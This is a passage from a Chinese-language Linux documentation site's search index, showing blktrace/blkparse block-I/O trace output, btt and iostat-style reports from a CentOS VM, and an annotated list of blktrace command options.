P N [jbd2/vda1-8] 253,0 1 195 0.629612235 291 A WS 7929368 + 8 <- (253,1) 7927320 253,0 1 196 0.629612441 291 Q WS 7929368 + 8 [jbd2/vda1-8] 253,0 1 197 0.629613193 291 M WS 7929368 + 8 [jbd2/vda1-8] 253,0 1 198 0.629614221 291 A WS 7929376 + 8 <- (253,1) 7927328 253,0 1 199 0.629614410 291 Q WS 7929376 + 8 [jbd2/vda1-8] 253,0 1 200 0.629614551 291 M WS 7929376 + 8 [jbd2/vda1-8] 253,0 1 201 0.629614907 291 A WS 7929384 + 8 <- (253,1) 7927336 253,0 1 202 0.629615095 291 Q WS 7929384 + 8 [jbd2/vda1-8] 253,0 1 203 0.629615227 291 M WS 7929384 + 8 [jbd2/vda1-8] 253,0 1 204 0.629615550 291 A WS 7929392 + 8 <- (253,1) 7927344 253,0 1 205 0.629615736 291 Q WS 7929392 + 8 [jbd2/vda1-8] 253,0 1 206 0.629615867 291 M WS 7929392 + 8 [jbd2/vda1-8] 253,0 1 207 0.629616209 291 A WS 7929400 + 8 <- (253,1) 7927352 253,0 1 208 0.629616408 291 Q WS 7929400 + 8 [jbd2/vda1-8] 253,0 1 209 0.629616542 291 M WS 7929400 + 8 [jbd2/vda1-8] 253,0 1 210 0.629617126 291 A WS 7929408 + 8 <- (253,1) 7927360 253,0 1 211 0.629617240 291 Q WS 7929408 + 8 [jbd2/vda1-8] 253,0 1 212 0.629617372 291 M WS 7929408 + 8 [jbd2/vda1-8] 253,0 1 213 0.629617659 291 A WS 7929416 + 8 <- (253,1) 7927368 253,0 1 214 0.629617776 291 Q WS 7929416 + 8 [jbd2/vda1-8] 253,0 1 215 0.629617908 291 M WS 7929416 + 8 [jbd2/vda1-8] 253,0 1 216 0.629618181 291 A WS 7929424 + 8 <- (253,1) 7927376 253,0 1 217 0.629618298 291 Q WS 7929424 + 8 [jbd2/vda1-8] 253,0 1 218 0.629618431 291 M WS 7929424 + 8 [jbd2/vda1-8] 253,0 1 219 0.629618932 291 A WS 7929432 + 8 <- (253,1) 7927384 253,0 1 220 0.629619051 291 Q WS 7929432 + 8 [jbd2/vda1-8] 253,0 1 221 0.629619184 291 M WS 7929432 + 8 [jbd2/vda1-8] 253,0 1 222 0.629619455 291 A WS 7929440 + 8 <- (253,1) 7927392 253,0 1 223 0.629619568 291 Q WS 7929440 + 8 [jbd2/vda1-8] 253,0 1 224 0.629619700 291 M WS 7929440 + 8 [jbd2/vda1-8] 253,0 1 225 0.629619977 291 A WS 7929448 + 8 <- (253,1) 7927400 253,0 1 226 0.629620095 291 Q WS 7929448 + 8 [jbd2/vda1-8] 253,0 1 227 0.629620227 291 M WS 7929448 + 8 [jbd2/vda1-8] 253,0 1 228 0.629620500 291 A WS 7929456 + 8 <- (253,1) 7927408 253,0 1 229 0.629620616 291 Q WS 7929456 + 8 [jbd2/vda1-8] 253,0 1 230 0.629620747 291 M WS 7929456 + 8 [jbd2/vda1-8] 253,0 1 231 0.629620940 291 A WS 7929464 + 8 <- (253,1) 7927416 253,0 1 232 0.629621055 291 Q WS 7929464 + 8 [jbd2/vda1-8] 253,0 1 233 0.629621187 291 M WS 7929464 + 8 [jbd2/vda1-8] 253,0 1 234 0.629621380 291 A WS 7929472 + 8 <- (253,1) 7927424 253,0 1 235 0.629621578 291 Q WS 7929472 + 8 [jbd2/vda1-8] 253,0 1 236 0.629621708 291 M WS 7929472 + 8 [jbd2/vda1-8] 253,0 1 237 0.629622048 291 A WS 7929480 + 8 <- (253,1) 7927432 253,0 1 238 0.629622252 291 Q WS 7929480 + 8 [jbd2/vda1-8] 253,0 1 239 0.629622384 291 M WS 7929480 + 8 [jbd2/vda1-8] 253,0 1 240 0.629622715 291 A WS 7929488 + 8 <- (253,1) 7927440 253,0 1 241 0.629622903 291 Q WS 7929488 + 8 [jbd2/vda1-8] 253,0 1 242 0.629623035 291 M WS 7929488 + 8 [jbd2/vda1-8] 253,0 1 243 0.629623303 291 A WS 7929496 + 8 <- (253,1) 7927448 253,0 1 244 0.629623492 291 Q WS 7929496 + 8 [jbd2/vda1-8] 253,0 1 245 0.629623623 291 M WS 7929496 + 8 [jbd2/vda1-8] 253,0 1 246 0.629623887 291 A WS 7929504 + 8 <- (253,1) 7927456 253,0 1 247 0.629624007 291 Q WS 7929504 + 8 [jbd2/vda1-8] 253,0 1 248 0.629624137 291 M WS 7929504 + 8 [jbd2/vda1-8] 253,0 1 249 0.629624908 291 UT N [jbd2/vda1-8] 1 253,0 1 250 0.629625461 291 I WS 7929360 + 152 [jbd2/vda1-8] 253,0 1 251 0.629626881 291 D WS 7929360 + 152 [jbd2/vda1-8] 253,0 0 287 0.631917933 0 C WS 7929360 + 152 [0] 253,0 0 288 0.631942024 291 A FWFS 7929512 + 8 <- (253,1) 7927464 253,0 0 289 0.631942881 291 Q FWFS 7929512 + 8 [jbd2/vda1-8] 253,0 0 290 0.631943388 291 G FWFS 7929512 + 8 [jbd2/vda1-8] 253,0 0 291 0.632065296 284 D WS 7929512 + 8 [kworker/0:1H] 253,0 0 292 0.632775420 0 C WS 7929512 + 8 [0] 253,0 0 293 0.632869996 0 C WS 7929512 [0] 253,0 0 294 6.100700399 291 A WS 7929520 + 8 <- (253,1) 7927472 253,0 0 295 6.100702727 291 Q WS 7929520 + 8 [jbd2/vda1-8] 253,0 0 296 6.100705727 291 G WS 7929520 + 8 [jbd2/vda1-8] 253,0 0 297 6.100709687 291 P N [jbd2/vda1-8] 253,0 0 298 6.100710501 291 A WS 7929528 + 8 <- (253,1) 7927480 253,0 0 299 6.100710732 291 Q WS 7929528 + 8 [jbd2/vda1-8] 253,0 0 300 6.100711905 291 M WS 7929528 + 8 [jbd2/vda1-8] 253,0 0 301 6.100712603 291 A WS 7929536 + 8 <- (253,1) 7927488 253,0 0 302 6.100712850 291 Q WS 7929536 + 8 [jbd2/vda1-8] 253,0 0 303 6.100713058 291 M WS 7929536 + 8 [jbd2/vda1-8] 253,0 0 304 6.100713616 291 A WS 7929544 + 8 <- (253,1) 7927496 253,0 0 305 6.100713853 291 Q WS 7929544 + 8 [jbd2/vda1-8] 253,0 0 306 6.100714068 291 M WS 7929544 + 8 [jbd2/vda1-8] 253,0 0 307 6.100715136 291 A WS 7929552 + 8 <- (253,1) 7927504 253,0 0 308 6.100715394 291 Q WS 7929552 + 8 [jbd2/vda1-8] 253,0 0 309 6.100715624 291 M WS 7929552 + 8 [jbd2/vda1-8] 253,0 0 310 6.100716072 291 A WS 7929560 + 8 <- (253,1) 7927512 253,0 0 311 6.100716243 291 Q WS 7929560 + 8 [jbd2/vda1-8] 253,0 0 312 6.100716444 291 M WS 7929560 + 8 [jbd2/vda1-8] 253,0 0 313 6.100716910 291 A WS 7929568 + 8 <- (253,1) 7927520 253,0 0 314 6.100717153 291 Q WS 7929568 + 8 [jbd2/vda1-8] 253,0 0 315 6.100717376 291 M WS 7929568 + 8 [jbd2/vda1-8] 253,0 0 316 6.100717752 291 A WS 7929576 + 8 <- (253,1) 7927528 253,0 0 317 6.100717986 291 Q WS 7929576 + 8 [jbd2/vda1-8] 253,0 0 318 6.100718199 291 M WS 7929576 + 8 [jbd2/vda1-8] 253,0 0 319 6.100718688 291 A WS 7929584 + 8 <- (253,1) 7927536 253,0 0 320 6.100718916 291 Q WS 7929584 + 8 [jbd2/vda1-8] 253,0 0 321 6.100719137 291 M WS 7929584 + 8 [jbd2/vda1-8] 253,0 0 322 6.100719664 291 A WS 7929592 + 8 <- (253,1) 7927544 253,0 0 323 6.100719882 291 Q WS 7929592 + 8 [jbd2/vda1-8] 253,0 0 324 6.100720106 291 M WS 7929592 + 8 [jbd2/vda1-8] 253,0 0 325 6.100720506 291 A WS 7929600 + 8 <- (253,1) 7927552 253,0 0 326 6.100720680 291 Q WS 7929600 + 8 [jbd2/vda1-8] 253,0 0 327 6.100720907 291 M WS 7929600 + 8 [jbd2/vda1-8] 253,0 0 328 6.100722039 291 UT N [jbd2/vda1-8] 1 253,0 0 329 6.100722945 291 I WS 7929520 + 88 [jbd2/vda1-8] 253,0 0 330 6.100726933 291 D WS 7929520 + 88 [jbd2/vda1-8] 253,0 0 331 6.102471460 0 C WS 7929520 + 88 [0] 253,0 0 332 6.102490992 291 A FWFS 7929608 + 8 <- (253,1) 7927560 253,0 0 333 6.102491627 291 Q FWFS 7929608 + 8 [jbd2/vda1-8] 253,0 0 334 6.102491999 291 G FWFS 7929608 + 8 [jbd2/vda1-8] 253,0 0 335 6.102604873 284 D WS 7929608 + 8 [kworker/0:1H] 253,0 0 336 6.103623307 0 C WS 7929608 + 8 [0] 253,0 0 337 6.103697330 0 C WS 7929608 [0] 253,0 2 1 7.234825143 6234 A WS 25475264 + 24 <- (253,1) 25473216 253,0 2 2 7.234827666 6234 Q WS 25475264 + 24 [YDService] 253,0 2 3 7.234830346 6234 G WS 25475264 + 24 [YDService] 253,0 2 4 7.234833032 6234 P N [YDService] 253,0 2 5 7.234834582 6234 UT N [YDService] 1 253,0 2 6 7.234835663 6234 I WS 25475264 + 24 [YDService] 253,0 2 7 7.234838679 6234 D WS 25475264 + 24 [YDService] 253,0 0 338 7.235957452 0 C WS 25475264 + 24 [0] 253,0 0 339 7.236031308 291 A WS 7929616 + 8 <- (253,1) 7927568 253,0 0 340 7.236032272 291 Q WS 7929616 + 8 [jbd2/vda1-8] 253,0 0 341 7.236033847 291 G WS 7929616 + 8 [jbd2/vda1-8] 253,0 0 342 7.236036110 291 P N [jbd2/vda1-8] 253,0 0 343 7.236036725 291 A WS 7929624 + 8 <- (253,1) 7927576 253,0 0 344 7.236036965 291 Q WS 7929624 + 8 [jbd2/vda1-8] 253,0 0 345 7.236037860 291 M WS 7929624 + 8 [jbd2/vda1-8] 253,0 0 346 7.236038571 291 A WS 7929632 + 8 <- (253,1) 7927584 253,0 0 347 7.236038840 291 Q WS 7929632 + 8 [jbd2/vda1-8] 253,0 0 348 7.236039076 291 M WS 7929632 + 8 [jbd2/vda1-8] 253,0 0 349 7.236039708 291 A WS 7929640 + 8 <- (253,1) 7927592 253,0 0 350 7.236040053 291 Q WS 7929640 + 8 [jbd2/vda1-8] 253,0 0 351 7.236040335 291 M WS 7929640 + 8 [jbd2/vda1-8] 253,0 0 352 7.236040794 291 A WS 7929648 + 8 <- (253,1) 7927600 253,0 0 353 7.236041051 291 Q WS 7929648 + 8 [jbd2/vda1-8] 253,0 0 354 7.236041283 291 M WS 7929648 + 8 [jbd2/vda1-8] 253,0 0 355 7.236041687 291 A WS 7929656 + 8 <- (253,1) 7927608 253,0 0 356 7.236041881 291 Q WS 7929656 + 8 [jbd2/vda1-8] 253,0 0 357 7.236042133 291 M WS 7929656 + 8 [jbd2/vda1-8] 253,0 0 358 7.236042477 291 A WS 7929664 + 8 <- (253,1) 7927616 253,0 0 359 7.236042670 291 Q WS 7929664 + 8 [jbd2/vda1-8] 253,0 0 360 7.236042905 291 M WS 7929664 + 8 [jbd2/vda1-8] 253,0 0 361 7.236043592 291 A WS 7929672 + 8 <- (253,1) 7927624 253,0 0 362 7.236043793 291 Q WS 7929672 + 8 [jbd2/vda1-8] 253,0 0 363 7.236043998 291 M WS 7929672 + 8 [jbd2/vda1-8] 253,0 0 364 7.236044477 291 A WS 7929680 + 8 <- (253,1) 7927632 253,0 0 365 7.236044653 291 Q WS 7929680 + 8 [jbd2/vda1-8] 253,0 0 366 7.236044869 291 M WS 7929680 + 8 [jbd2/vda1-8] 253,0 0 367 7.236045709 291 A WS 7929688 + 8 <- (253,1) 7927640 253,0 0 368 7.236046036 291 Q WS 7929688 + 8 [jbd2/vda1-8] 253,0 0 369 7.236057252 291 M WS 7929688 + 8 [jbd2/vda1-8] 253,0 0 370 7.236057852 291 A WS 7929696 + 8 <- (253,1) 7927648 253,0 0 371 7.236058077 291 Q WS 7929696 + 8 [jbd2/vda1-8] 253,0 0 372 7.236058286 291 M WS 7929696 + 8 [jbd2/vda1-8] 253,0 0 373 7.236059324 291 UT N [jbd2/vda1-8] 1 253,0 0 374 7.236060184 291 I WS 7929616 + 88 [jbd2/vda1-8] 253,0 0 375 7.236062500 291 D WS 7929616 + 88 [jbd2/vda1-8] 253,0 0 376 7.237660002 0 C WS 7929616 + 88 [0] 253,0 0 377 7.237682084 291 A FWFS 7929704 + 8 <- (253,1) 7927656 253,0 0 378 7.237682713 291 Q FWFS 7929704 + 8 [jbd2/vda1-8] 253,0 0 379 7.237682989 291 G FWFS 7929704 + 8 [jbd2/vda1-8] 253,0 0 380 7.237834365 284 D WS 7929704 + 8 [kworker/0:1H] 253,0 0 381 7.238811564 0 C WS 7929704 + 8 [0] 253,0 0 382 7.238915905 0 C WS 7929704 [0] 253,0 2 8 7.238986214 6234 A WS 25475264 + 8 <- (253,1) 25473216 253,0 2 9 7.238987851 6234 Q WS 25475264 + 8 [YDService] 253,0 2 10 7.238988819 6234 G WS 25475264 + 8 [YDService] 253,0 2 11 7.238990407 6234 P N [YDService] 253,0 2 12 7.238991052 6234 UT N [YDService] 1 253,0 2 13 7.238991628 6234 I WS 25475264 + 8 [YDService] 253,0 2 14 7.239005299 6234 D WS 25475264 + 8 [YDService] 253,0 0 383 7.239888096 0 C WS 25475264 + 8 [0] 253,0 0 384 7.239938613 291 A WS 7929712 + 8 <- (253,1) 7927664 253,0 0 385 7.239939517 291 Q WS 7929712 + 8 [jbd2/vda1-8] 253,0 0 386 7.239940231 291 G WS 7929712 + 8 [jbd2/vda1-8] 253,0 0 387 7.239941282 291 P N [jbd2/vda1-8] 253,0 0 388 7.239941694 291 A WS 7929720 + 8 <- (253,1) 7927672 253,0 0 389 7.239942093 291 Q WS 7929720 + 8 [jbd2/vda1-8] 253,0 0 390 7.239943049 291 M WS 7929720 + 8 [jbd2/vda1-8] 253,0 0 391 7.239943816 291 UT N [jbd2/vda1-8] 1 253,0 0 392 7.239944390 291 I WS 7929712 + 16 [jbd2/vda1-8] 253,0 0 393 7.239945588 291 D WS 7929712 + 16 [jbd2/vda1-8] 253,0 0 394 7.240935597 0 C WS 7929712 + 16 [0] 253,0 0 395 7.240946972 291 A FWFS 7929728 + 8 <- (253,1) 7927680 253,0 0 396 7.240947401 291 Q FWFS 7929728 + 8 [jbd2/vda1-8] 253,0 0 397 7.240947679 291 G FWFS 7929728 + 8 [jbd2/vda1-8] 253,0 0 398 7.241051410 284 D WS 7929728 + 8 [kworker/0:1H] 253,0 0 399 7.241991106 0 C WS 7929728 + 8 [0] 253,0 0 400 7.242084868 0 C WS 7929728 [0] 253,0 2 15 7.242139450 6234 A WS 17121960 + 16 <- (253,1) 17119912 253,0 2 16 7.242140532 6234 Q WS 17121960 + 16 [YDService] 253,0 2 17 7.242141469 6234 G WS 17121960 + 16 [YDService] 253,0 2 18 7.242142601 6234 P N [YDService] 253,0 2 19 7.242143182 6234 UT N [YDService] 1 253,0 2 20 7.242143604 6234 I WS 17121960 + 16 [YDService] 253,0 2 21 7.242144834 6234 D WS 17121960 + 16 [YDService] 253,0 0 401 7.245747942 0 C WS 17121960 + 16 [0] 253,0 0 402 7.245799517 291 A WS 7929736 + 8 <- (253,1) 7927688 253,0 0 403 7.245800161 291 Q WS 7929736 + 8 [jbd2/vda1-8] 253,0 0 404 7.245800912 291 G WS 7929736 + 8 [jbd2/vda1-8] 253,0 0 405 7.245801994 291 P N [jbd2/vda1-8] 253,0 0 406 7.245802497 291 A WS 7929744 + 8 <- (253,1) 7927696 253,0 0 407 7.245802747 291 Q WS 7929744 + 8 [jbd2/vda1-8] 253,0 0 408 7.245803266 291 M WS 7929744 + 8 [jbd2/vda1-8] 253,0 0 409 7.245803950 291 UT N [jbd2/vda1-8] 1 253,0 0 410 7.245804360 291 I WS 7929736 + 16 [jbd2/vda1-8] 253,0 0 411 7.245805765 291 D WS 7929736 + 16 [jbd2/vda1-8] 253,0 0 412 7.246696643 0 C WS 7929736 + 16 [0] 253,0 0 413 7.246708021 291 A FWFS 7929752 + 8 <- (253,1) 7927704 253,0 0 414 7.246708418 291 Q FWFS 7929752 + 8 [jbd2/vda1-8] 253,0 0 415 7.246708677 291 G FWFS 7929752 + 8 [jbd2/vda1-8] 253,0 0 416 7.246814502 284 D WS 7929752 + 8 [kworker/0:1H] 253,0 0 417 7.247668647 0 C WS 7929752 + 8 [0] 253,0 0 418 7.247757651 0 C WS 7929752 [0] CPU0 (myvda): Reads Queued: 0, 0KiB Writes Queued: 87, 348KiB Read Dispatches: 0, 0KiB Write Dispatches: 34, 348KiB Reads Requeued: 0 Writes Requeued: 0 Reads Completed: 0, 0KiB Writes Completed: 72, 640KiB Read Merges: 0, 0KiB Write Merges: 53, 212KiB Read depth: 0 Write depth: 3 IO unplugs: 0 Timer unplugs: 17 CPU1 (myvda): Reads Queued: 0, 0KiB Writes Queued: 63, 268KiB Read Dispatches: 0, 0KiB Write Dispatches: 18, 268KiB Reads Requeued: 0 Writes Requeued: 0 Reads Completed: 0, 0KiB Writes Completed: 0, 0KiB Read Merges: 0, 0KiB Write Merges: 45, 180KiB Read depth: 0 Write depth: 3 IO unplugs: 0 Timer unplugs: 13 CPU2 (myvda): Reads Queued: 0, 0KiB Writes Queued: 3, 24KiB Read Dispatches: 0, 0KiB Write Dispatches: 3, 24KiB Reads Requeued: 0 Writes Requeued: 0 Reads Completed: 0, 0KiB Writes Completed: 0, 0KiB Read Merges: 0, 0KiB Write Merges: 0, 0KiB Read depth: 0 Write depth: 3 IO unplugs: 0 Timer unplugs: 3 Total (myvda): Reads Queued: 0, 0KiB Writes Queued: 153, 640KiB Read Dispatches: 0, 0KiB Write Dispatches: 55, 640KiB Reads Requeued: 0 Writes Requeued: 0 Reads Completed: 0, 0KiB Writes Completed: 72, 640KiB Read Merges: 0, 0KiB Write Merges: 98, 392KiB IO unplugs: 0 Timer unplugs: 33 Throughput (R/W): 0KiB/s / 88KiB/s Events (myvda): 690 entries Skips: 0 forward (0 - 0.0%) [root@VM-0-16-centos mydata]# ls myvdabin myvda.blktrace.0 myvda.blktrace.1 myvda.blktrace.2 myvda.blktrace.3 [root@VM-0-16-centos mydata]# btt -I iostatreport -i myvdabin ==================== All Devices ==================== ALL MIN AVG MAX N --------------- ------------- ------------- ------------- ----------- Q2Qdm 0.000000438 0.047675694 5.468759846 152 Q2Cdm 0.000631999 0.001516763 0.003607410 153 Q2G 0.000000160 0.000000786 0.000004391 55 G2I 0.000001009 0.000004959 0.000026337 38 Q2M 0.000000126 0.000000332 0.000011216 98 I2D 0.000000630 0.000002691 0.000017820 38 M2D 0.000001295 0.000008099 0.000024640 98 D2C 0.000630444 0.001496100 0.003603108 153 ==================== Device Overhead ==================== DEV | Q2G G2I Q2M I2D D2C ---------- | --------- --------- --------- --------- --------- ==================== Device Merge Information ==================== DEV | #Q #D Ratio | BLKmin BLKavg BLKmax Total ---------- | -------- -------- ------- | -------- -------- -------- -------- (253, 0) | 153 55 2.8 | 8 23 224 1280 ==================== Device Q2Q Seek Information ==================== DEV | NSEEKS MEAN MEDIAN | MODE ---------- | --------------- --------------- --------------- | --------------- (253, 0) | 153 3417216.7 0 | 0(116) ---------- | --------------- --------------- --------------- | --------------- Overall | NSEEKS MEAN MEDIAN | MODE Average | 153 3417216.7 0 | 0(116) ==================== Device D2D Seek Information ==================== DEV | NSEEKS MEAN MEDIAN | MODE ---------- | --------------- --------------- --------------- | --------------- (253, 0) | 55 9506075.1 0 | 0(18) ---------- | --------------- --------------- --------------- | --------------- Overall | NSEEKS MEAN MEDIAN | MODE Average | 55 9506075.1 0 | 0(18) ==================== Plug Information ==================== DEV | # Plugs # Timer Us | % Time Q Plugged ---------- | ---------- ---------- | ---------------- (253, 0) | 0( 33) | 0.001672731% DEV | IOs/Unp IOs/Unp(to) ---------- | ---------- ---------- (253, 0) | 0.0 1.2 ---------- | ---------- ---------- Overall | IOs/Unp IOs/Unp(to) Average | 0.0 1.2 ==================== Active Requests At Q Information ==================== DEV | Avg Reqs @ Q ---------- | ------------- ==================== I/O Active Period Information ==================== DEV | # Live Avg. Act Avg. !Act % Live ---------- | ---------- ------------- ------------- ------ (253, 0) | 50 0.001091889 0.146797433 0.75 ---------- | ---------- ------------- ------------- ------ Total Sys | 50 0.001091889 0.146797433 0.75 # Total System # Total System : q activity 0.000002963 0.0 0.000002963 0.4 0.041019970 0.4 0.041019970 0.0 0.628180716 0.0 0.628180716 0.4 0.631942881 0.4 0.631942881 0.0 6.100702727 0.0 6.100702727 0.4 6.102491627 0.4 6.102491627 0.0 7.234827666 0.0 7.234827666 0.4 7.246708418 0.4 7.246708418 0.0 # Total System : c activity 0.000910827 0.5 0.000910827 0.9 0.042000051 0.9 0.042000051 0.5 0.629566828 0.5 0.629566828 0.9 0.632775420 0.9 0.632775420 0.5 6.102471460 0.5 6.102471460 0.9 6.103623307 0.9 6.103623307 0.5 7.235957452 0.5 7.235957452 0.9 7.247668647 0.9 7.247668647 0.5 # Per process # YDService : q activity 7.234827666 1.0 7.234827666 1.4 7.242140532 1.4 7.242140532 1.0 # YDService : c activity # auditd : q activity 0.628180716 2.0 0.628180716 2.4 0.628180716 2.4 0.628180716 2.0 # auditd : c activity # barad_agent : q activity 0.000002963 3.0 0.000002963 3.4 0.039442111 3.4 0.039442111 3.0 # barad_agent : c activity # jbd2 : q activity 0.000961174 4.0 0.000961174 4.4 0.041019970 4.4 0.041019970 4.0 0.629608842 4.0 0.629608842 4.4 0.631942881 4.4 0.631942881 4.0 6.100702727 4.0 6.100702727 4.4 6.102491627 4.4 6.102491627 4.0 7.236032272 4.0 7.236032272 4.4 7.246708418 4.4 7.246708418 4.0 # jbd2 : c activity # kernel : q activity # kernel : c activity 0.000910827 5.5 0.000910827 5.9 0.042000051 5.9 0.042000051 5.5 0.629566828 5.5 0.629566828 5.9 0.632775420 5.9 0.632775420 5.5 6.102471460 5.5 6.102471460 5.9 6.103623307 5.9 6.103623307 5.5 7.235957452 5.5 7.235957452 5.9 7.247668647 5.9 7.247668647 5.5 [root@VM-0-16-centos mydata]# cat iostatreport Device: rrqm/s wrqm/s r/s w/s rsec/s wsec/s rkB/s wkB/s avgrq-sz avgqu-sz await svctm %util Stamp (253, 0) 0.00 12.46 0.00 7.21 0.00 162.60 0.00 81.30 22.55 -74.00 1.40 4.12 10.37 6.10 (253, 0) 0.00 8.82 0.00 1.76 0.00 84.65 0.00 42.32 48.00 -85.98 1.61 10.23 0.26 7.23 Device: rrqm/s wrqm/s r/s w/s rsec/s wsec/s rkB/s wkB/s avgrq-sz avgqu-sz await svctm %util Stamp (253, 0) 0.00 13.52 0.00 7.59 0.00 176.61 0.00 88.30 23.27 -75.91 1.40 4.22 8.95 TOTAL","title":"blktrace\u547d\u4ee4"},{"location":"system/linux/IO/blktrace/#io","text":"","title":"\u8ddf\u8e2aIO\u7cfb\u5217"},{"location":"system/linux/IO/blktrace/#blktrace","text":"","title":"blktrace\u547d\u4ee4"},{"location":"system/linux/IO/blktrace/#_1","text":"blktrace -d dev [ -r debugfs_path ] [ -o output ] [-k ] [ -w time ] [ -a action ] [ -A action_mask ] [ -v ]","title":"\u8bed\u6cd5"},{"location":"system/linux/IO/blktrace/#_2","text":"blktrace\u662f\u4e00\u4e2a\u5757\u5c42IO\u8ddf\u8e2a\u547d\u4ee4 $ blktrace -help -d <dev> | --dev=<dev> \u586b\u5199\u4e00\u4e2a\u8ddf\u8e2a\u7684\u78c1\u76d8\uff0c\u5fc5\u586b\u9009\u9879 [ -r <debugfs path> | --relay=<debugfs path> ] \u6307\u5b9adebugfs\u7684\u6302\u8f7d\u8def\u5f84 [ -o <file> | --output=<file>] \u8f93\u51fa\u7684\u6587\u4ef6\u53eb\u4ec0\u4e48,\u9ed8\u8ba4\u503c\u4e3a device.blktrace.cpu\u3002 -o - \u53ef\u4ee5\u628a\u8f93\u51fa\u6253\u5370\u5c4f\u5e55\u4e0a [ -D <dir> | --output-dir=<dir> \u8f93\u51fa\u7684\u76ee\u5f55 [ -w <time> | --stopwatch=<time>] \u8ddf\u8e2a\u7684\u65f6\u957f\uff0c\u9ed8\u8ba4\u5355\u4f4d\u4e3a\u79d2 [ -a <action field> | --act-mask=<action field>] \u8ddf\u8e2a\u54ea\u79cd\u78c1\u76d8\u884c\u4e3a [ -A <action mask> | --set-mask=<action mask>] \u901a\u8fc716\u4f4d\u63a9\u7801\u8bbe\u7f6e\u8ddf\u8e2a\u54ea\u79cd\u78c1\u76d8\u884c\u4e3a [ -b <size> | --buffer-size] \u7f13\u5b58\u533a\u7684\u5927\u5c0f\uff0c\u9ed8\u8ba4\u4e3a512KB\uff0c\u9ed8\u8ba4\u5355\u4f4d\u4e3aK [ -n <number> | --num-sub-buffers=<number>] \u9ed8\u8ba4\u7f13\u5b58\u533a\u7684\u4e2a\u6570\uff0c\u9ed8\u8ba4\u4e3a4\u4e2a [ -l | --listen] \u5f00\u542f\u76d1\u542c\uff08blktrace\u670d\u52a1\u5668\u6a21\u5f0f\uff09 [ -h <hostname> | --host=<hostname>] \u5ba2\u6237\u7aef\u6a21\u5f0f\uff0c\u8981\u94fe\u63a5\u54ea\u4e2a\u4e3b\u673a\u4e0a [ -p <port number> | --port=<port number>] \u7f51\u7edc\u6a21\u5f0f\u8981\u4f7f\u7528\u54ea\u4e2a\u7aef\u53e3\u9ed8\u8ba4\u4e3a8462 [ -s | --no-sendfile] \u5728\u7f51\u7edc\u5ba2\u6237\u7aef\u6a21\u5f0f\u4e0b\uff0c\u4e0d\u4f7f\u7528sendfile()\u7cfb\u7edf\u8c03\u7528\u6765\u4f20\u8f93\u6570\u636e [ -I <devs file> | --input-devs=<devs file>] \u8f93\u5165\u6587\u4ef6\uff0c\u5c06\u6587\u4ef6\u4f5c\u4e3a\u8bbe\u7f6e [ -v <version> | --version] \u6253\u5370\u7248\u672c [ -V <version> | --version] \u6253\u5370\u7248\u672c -d Use specified device. May also be given last after options \u8ddf\u8e2a\u4e00\u4e2a\u8bbe\u5907\uff0c\u53ef\u4ee5\u653e\u5728\u6700\u540e -r Path to mounted debugfs, defaults to /sys/kernel/debug \u6307\u5b9adebugfs\u7684\u6302\u8f7d\u8def\u5f84\uff0c\u9ed8\u8ba4\u6307\u5411/sys/kernel/debug -o File(s) to send output to \u8981\u8f93\u51fa\u53d1\u9001\u5230\u54ea\u4e2a\u6587\u4ef6\u4e2d -D Directory to prepend to output file names \u8f93\u51fa\u6587\u4ef6\u5728\u54ea\u4e2a\u76ee\u5f55\u4e2d -w Stop after defined time, in seconds \u8981\u8ddf\u8e2a\u591a\u5c11\u79d2 -a Only trace specified actions. See documentation \u4ec5\u4ec5\u8ddf\u8e2a\u4e00\u4e2a\u78c1\u76d8\u884c\u4e3a \u53ef\u4ee5\u6dfb\u52a0\u591a\u4e2a-a -A Give trace mask as a single value. See documentation \u901a\u8fc716\u4f4d\u63a9\u7801\u8bbe\u7f6e\u8ddf\u8e2a\u54ea\u79cd\u78c1\u76d8\u884c\u4e3a -b Sub buffer size in KiB (default 512) \u7f13\u51b2\u533a\u5927\u5c0f\uff0c\u9ed8\u8ba4\u4e3a512K\uff0c\u5355\u4f4d\u4e3aK -n Number of sub buffers (default 4) \u7f13\u51b2\u533a\u4e2a\u6570\uff0c\u9ed8\u8ba4\u4e3a4\u4e2a -l Run in network listen mode (blktrace server) \u8fd0\u884cblktrace\u4e3a\u670d\u52a1\u7aef\u6a21\u5f0f\uff0c\u6253\u5f00\u76d1\u542c -h Run in network client mode, connecting to the given host \u8fd0\u884cblktrace\u4e3a\u5ba2\u6237\u7aef\u6a21\u5f0f\uff0c-h\u540e\u9762\u52a0\u670d\u52a1\u7aef\u7684\u4e3b\u673aIP\u5730\u5740 -p Network port to use (default 8462) \u7f51\u7edc\u6a21\u5f0f\u7684\u7aef\u53e3\uff0c\u9ed8\u8ba4\u4e3a8462 -s Make the network client NOT use sendfile() to transfer data \u7f51\u7edc\u6a21\u5f0f\u4e0b\u53d1\u9001\u6570\u636e\u4e0d\u4f7f\u7528sendfile()\u7cfb\u7edf\u8c03\u7528 -I Add devices found in <devs file> \u5728\u6587\u4ef6\u4e2d\u67e5\u627e\u8bbe\u5907\uff08\u4e0d\u77e5\u9053\u4ec0\u4e48\u610f\u601d\uff09 -v Print program version info \u6253\u5370\u7248\u672c\u4fe1\u606f -V Print program version info \u6253\u5370\u7248\u672c\u4fe1\u606f","title":"\u547d\u4ee4\u9009\u9879"},{"location":"system/linux/IO/blktrace/#_3","text":"-a \u53ef\u4ee5\u6dfb\u52a0\u4f5c\u4e3a\u8fc7\u6ee4\u7684\u9009\u9879 barrier: barrier attribute complete: completed by driver fs: requests issue: issued to driver pc: packet command events queue: queue operations read: read traces requeue: requeue operations sync: synchronous attribute write: write traces notify: trace messages drv_data: additional driver specific trace 